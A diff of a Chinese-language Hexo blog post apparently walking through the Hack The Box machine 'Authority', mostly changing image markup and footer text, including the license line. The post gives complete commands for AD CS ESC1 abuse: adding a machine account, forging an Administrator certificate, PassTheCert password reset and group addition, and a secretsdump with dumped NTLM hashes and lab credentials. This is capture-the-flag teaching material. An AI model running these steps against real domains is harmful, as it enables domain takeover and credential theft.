 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>前面SMB里有ADCS相关目录，C盘根目录也有Certs，里面是ldaps相关证书：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071714.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071714.jpg" alt=""></p>
 <p>直接certipy也可以发现存在漏洞的模板，但需要是Domain Computers才能利用，所以首先需要添加一个机器账户：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">certipy find -vulnerable -stdout -u svc_ldap -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222 -scheme ldap</span><br><span class="line"></span><br><span class="line">Template Name                       : CorpVPN</span><br><span class="line">Certificate Authorities             : AUTHORITY-CA</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071715.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071715.jpg" alt=""></p>
 <h1 id="ADCS-ESC1"><a href="#ADCS-ESC1" class="headerlink" title="ADCS ESC1"></a>ADCS ESC1</h1><p>svc_ldap可以添加机器账号，然后就是esc1一步步：</p>
 <ul>
 <li>AD CS Domain Escalation - HackTricks<br><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1" target="_blank" rel="noopener">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1</a></li>
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/Tools/impacket/examples/addcomputer.py authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name miao$ -computer-pass Miao@123456 -dc-ip 10.10.11.222</span><br><span class="line"></span><br><span class="line">certipy req -u 'miao$' -p 'Miao@123456' -dc-ip 10.10.11.222 -ca AUTHORITY-CA -template 'CorpVPN' -upn 'Administrator'</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071716.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071716.jpg" alt=""></p>
 <p>但得到的证书并不能直接获取hash，因为KDC不支持kerberos认证，搜索信息，需要通过PassTheCert方式：</p>
 <ul>
 <li>Help understanding limitations of “KDC_ERR_PADATA_TYPE_NOSUPP” · Issue #64 · ly4k/Certipy<br><a href="https://github.com/ly4k/Certipy/issues/64" target="_blank" rel="noopener">https://github.com/ly4k/Certipy/issues/64</a></li>
 <li>Authenticating with certificates when PKINIT is not supported - Almond Offensive Security Blog<br><a href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html" target="_blank" rel="noopener">https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html</a></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071717.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071717.jpg" alt=""></p>
 <h1 id="PassTheCert-amp-root-flag"><a href="#PassTheCert-amp-root-flag" class="headerlink" title="PassTheCert &amp; root flag"></a>PassTheCert &amp; root flag</h1><p>使用提供的python版本PassTheCert:</p>
 <ul>
 <li>AlmondOffSec/PassTheCert: Proof-of-Concept tool to authenticate to an LDAP/S server with a certificate through Schannel<br><a href="https://github.com/AlmondOffSec/PassTheCert" target="_blank" rel="noopener">https://github.com/AlmondOffSec/PassTheCert</a></li>
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">certipy cert -pfx administrator.pfx -nokey -out user.crt</span><br><span class="line">certipy cert -pfx administrator.pfx -nocert -out user.key</span><br><span class="line"></span><br><span class="line">python3 passthecert.py -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -action whoami</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071718.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071718.jpg" alt=""></p>
 <p>然后就可以使用其他action，例如modify_user修改管理员密码，或者ldap-shell里进行操作添加管理员(调用的是impacket的ldap-shell)：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 passthecert.py -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -action modify_user -target administrator -new-pass Miao@123456</span><br><span class="line"></span><br><span class="line">python3 passthecert.py -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -action ldap-shell</span><br><span class="line"></span><br><span class="line">add_user_to_group svc_ldap Administrators</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071719.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071721.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071720.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071719.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071721.jpg" alt=""></p>
+<h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071720.jpg" alt=""></p>
 <h2 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h2><p>用svc_ldap来，不修改原本的任何账号密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/Tools/impacket/examples/secretsdump.py svc_ldap:"lDaP_1n_th3_cle4r\!"@10.10.11.222 -just-dc-ntlm</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::</span><br><span class="line">svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::</span><br><span class="line"><span class="meta">AUTHORITY$</span><span class="bash">:1000:aad3b435b51404eeaad3b435b51404ee:5f2d84fb5e44ccaddb52c672b9578fcb:::</span></span><br></pre></td></tr></table></figure>
 
@@ -477,7 +337,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2023-12-11T03:10:23.115Z" itemprop="dateUpdated">2023-12-11 11:10:23</time>
+    Last updated: <time datetime="2023-12-11T03:10:23.115Z" itemprop="dateUpdated">2023-12-11 11:10:23</time>
 </span><br>
 
 
@@ -644,11 +504,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
